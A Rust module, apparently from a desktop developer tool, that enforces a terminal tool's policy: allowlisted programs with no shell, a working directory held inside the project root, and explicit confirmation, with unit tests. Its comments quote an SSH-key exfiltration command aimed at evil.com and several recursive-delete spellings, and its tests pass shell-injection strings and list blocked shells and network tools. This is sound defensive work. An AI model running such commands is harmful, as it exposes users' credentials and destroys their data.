// The terminal tool's policy: an ALLOWLIST over a program plus an argument
// vector, not a denylist over a shell string.
//
// The previous implementation matched substrings ("rm -rf", "sudo ") against a
// command line and then handed the line to `sh -c` / `cmd /C`. That is not a
// sandbox. `rm -fr`, `rm  -rf`, `rm -r -f`, `find . -delete`,
// `python -c "shutil.rmtree('/')"` all walk straight through it, and nothing in it
// addresses exfiltration at all — `curl -X POST evil.com -d @~/.ssh/id_rsa`
// contains no forbidden substring. A denylist can only refuse the spellings
// somebody thought of.
//
// So the shape changed instead of the list:
//
//   1. NO SHELL. The caller sends `program` and `args: Vec<String>`, spawned
//      directly. There is no shell to interpret `;`, `|`, `&&`, `$(...)`, or
//      backticks, so those characters reach the child as literal argument bytes —
//      the same reason packages/core/src/verify/runner.ts spawns with
//      `shell: false` (Requirement 5.1).
//   2. ALLOWLISTED PROGRAM. Bare names only, matched against ALLOWED_PROGRAMS. A
//      path, a relative path, or anything not on the list is refused by name.
//   3. CONTAINED CWD. The working directory must be an existing directory inside
//      the open project root, canonicalized first so `..` cannot climb out.
//   4. EXPLICIT CONFIRMATION. The caller must pass `confirmed: true`. See
//      `require_confirmation`.
//
// This module depends on nothing but `std`, deliberately: its tests run with
//
//   rustc --test src/command_policy.rs -o <tmp>/policy && <tmp>/policy
//
// which needs no Tauri toolchain. `cargo test --bin sketch-desktop` runs them too
// where the full Tauri build works.
//
// Validates: Requirements 22.6, 22.4

use std::path::{Component, Path, PathBuf};

/// Programs the terminal tool may start.
///
/// Chosen as the smallest set that covers what this dev tool actually drives: the
/// verification stages the engine already runs (`npm`, `node`), version control
/// (`git`), and the two other toolchains the repo and its users build with
/// (`cargo`, `python`). Deliberately absent: `sh`/`bash`/`cmd`/`powershell`, which
/// would re-open arbitrary execution and undo point 1; `npx`, which resolves and
/// runs arbitrary packages; `curl`/`wget`, whose only use here is moving bytes off
/// the machine; and anything that installs system-wide.
pub const ALLOWED_PROGRAMS: &[&str] = &["git", "npm", "node", "cargo", "python"];

/// Programs are matched bare. Anything with a separator is a path, and a path is a
/// way around a name-based allowlist.
fn looks_like_path(program: &str) -> bool {
    program.contains('/') || program.contains('\\') || program.contains(':')
}

/// Resolve a requested program to the executable name to spawn.
///
/// On Windows the npm entry point is `npm.cmd`. Rust's `Command` runs batch files
/// through a properly escaped `cmd.exe` invocation itself (the fix shipped in Rust
/// 1.77.2), so naming it here does not reintroduce a shell the caller can reach.
pub fn resolve_program(program: &str) -> Result<String, String> {
    let requested = program.trim();
    if requested.is_empty() {
        return Err("no program given".to_string());
    }
    if looks_like_path(requested) {
        return Err(format!(
            "program '{}' is refused: name an allowlisted program, not a path. Allowed: {}",
            requested,
            ALLOWED_PROGRAMS.join(", ")
        ));
    }

    let name = requested.to_lowercase();
    let name = name.strip_suffix(".exe").unwrap_or(&name);
    let name = name.strip_suffix(".cmd").unwrap_or(name);

    if !ALLOWED_PROGRAMS.contains(&name) {
        return Err(format!(
            "program '{}' is not on the terminal allowlist. Allowed: {}",
            requested,
            ALLOWED_PROGRAMS.join(", ")
        ));
    }

    if cfg!(target_os = "windows") && name == "npm" {
        return Ok("npm.cmd".to_string());
    }
    Ok(name.to_string())
}

/// Arguments are passed to the child verbatim. The only rejection is a NUL byte,
/// which cannot survive an OS argument boundary.
pub fn check_args(args: &[String]) -> Result<(), String> {
    for (index, arg) in args.iter().enumerate() {
        if arg.contains('\0') {
            return Err(format!("argument {} contains a NUL byte", index));
        }
    }
    Ok(())
}

/// Component-wise containment. `Path::starts_with` compares components, not bytes,
/// so a sibling directory named like a prefix of the root cannot pass.
fn is_within(root: &Path, candidate: &Path) -> bool {
    candidate.starts_with(root)
}

/// Reject a path that tries to climb with `..` before the disk is even consulted,
/// so the error names the real problem.
fn has_parent_escape(path: &Path) -> bool {
    path.components().any(|c| matches!(c, Component::ParentDir))
}

/// Resolve the working directory, refusing anything outside the open project root.
///
/// Both sides are canonicalized before comparison: without that, `root/../..` and a
/// symlink both defeat a prefix test.
pub fn resolve_cwd(project_root: &str, cwd: &str) -> Result<PathBuf, String> {
    if project_root.trim().is_empty() {
        return Err("no project root is open, so no command may run".to_string());
    }

    let root = PathBuf::from(project_root);
    let root = root
        .canonicalize()
        .map_err(|e| format!("project root '{}' is not usable: {}", project_root, e))?;
    if !root.is_dir() {
        return Err(format!("project root '{}' is not a directory", project_root));
    }

    let requested = if cwd.trim().is_empty() {
        root.clone()
    } else {
        let raw = PathBuf::from(cwd);
        if raw.is_relative() && has_parent_escape(&raw) {
            return Err(format!(
                "working directory '{}' escapes the project root {}",
                cwd,
                root.display()
            ));
        }
        if raw.is_relative() {
            root.join(raw)
        } else {
            raw
        }
    };

    let resolved = requested
        .canonicalize()
        .map_err(|e| format!("invalid working directory '{}': {}", cwd, e))?;

    if !resolved.is_dir() {
        return Err(format!("invalid working directory: {}", resolved.display()));
    }

    if !is_within(&root, &resolved) {
        return Err(format!(
            "working directory {} is outside the open project root {}",
            resolved.display(),
            root.display()
        ));
    }

    Ok(resolved)
}

/// The confirmation gate.
///
/// DECISION: confirmation is an explicit flag on the call, not an assumption about
/// the caller. The UI still owns the prompt — the terminal panel must ask before it
/// invokes, and task 3.6 (Code surface terminal) owns that dialog — but the backend
/// refuses an unconfirmed invocation regardless, so a panel that forgets to ask
/// cannot run anything. Requirement 22.6 asks for scoped AND confirmable; a flag
/// the frontend can hardcode would only be the first half, which is why the message
/// says what is missing rather than silently proceeding.
pub fn require_confirmation(confirmed: bool) -> Result<(), String> {
    if confirmed {
        return Ok(());
    }
    Err("command not confirmed: the terminal tool requires an explicit user confirmation before it runs anything".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn allows_listed_programs() {
        assert_eq!(resolve_program("git").unwrap(), "git");
        assert_eq!(resolve_program("  cargo  ").unwrap(), "cargo");
        assert_eq!(resolve_program("NODE").unwrap(), "node");
    }

    #[test]
    fn refuses_unlisted_programs() {
        for program in ["sh", "bash", "cmd", "powershell", "curl", "npx", "rm"] {
            let err = resolve_program(program).unwrap_err();
            assert!(err.contains("not on the terminal allowlist"), "{}", err);
        }
    }

    #[test]
    fn refuses_paths_to_dodge_the_allowlist() {
        for program in ["/bin/sh", "..\\..\\git.exe", "C:\\Windows\\system32\\cmd.exe"] {
            let err = resolve_program(program).unwrap_err();
            assert!(err.contains("not a path"), "{}", err);
        }
    }

    #[test]
    fn arguments_with_shell_metacharacters_are_data_not_syntax() {
        // No shell runs, so these are legal argument bytes. The point of the test is
        // that they are accepted AS ARGUMENTS and never concatenated into a line.
        let args = vec![
            "status".to_string(),
            "; rm -rf /".to_string(),
            "$(whoami)".to_string(),
            "a && b".to_string(),
        ];
        assert!(check_args(&args).is_ok());
    }

    #[test]
    fn refuses_nul_bytes_in_arguments() {
        let args = vec!["sta\0tus".to_string()];
        assert!(check_args(&args).is_err());
    }

    #[test]
    fn confirmation_is_required() {
        assert!(require_confirmation(false).is_err());
        assert!(require_confirmation(true).is_ok());
    }

    #[test]
    fn cwd_must_stay_inside_the_project_root() {
        let root = std::env::temp_dir().join("sketch-policy-test-root");
        let inside = root.join("nested");
        std::fs::create_dir_all(&inside).unwrap();
        let outside = std::env::temp_dir().join("sketch-policy-test-outside");
        std::fs::create_dir_all(&outside).unwrap();

        let root_str = root.to_string_lossy().to_string();

        assert!(resolve_cwd(&root_str, &inside.to_string_lossy()).is_ok());
        assert!(resolve_cwd(&root_str, "nested").is_ok());

        let err = resolve_cwd(&root_str, &outside.to_string_lossy()).unwrap_err();
        assert!(err.contains("outside the open project root"), "{}", err);

        let err = resolve_cwd(&root_str, "../..").unwrap_err();
        assert!(err.contains("escapes the project root"), "{}", err);
    }

    #[test]
    fn missing_project_root_refuses_everything() {
        assert!(resolve_cwd("", "anywhere").is_err());
    }
}
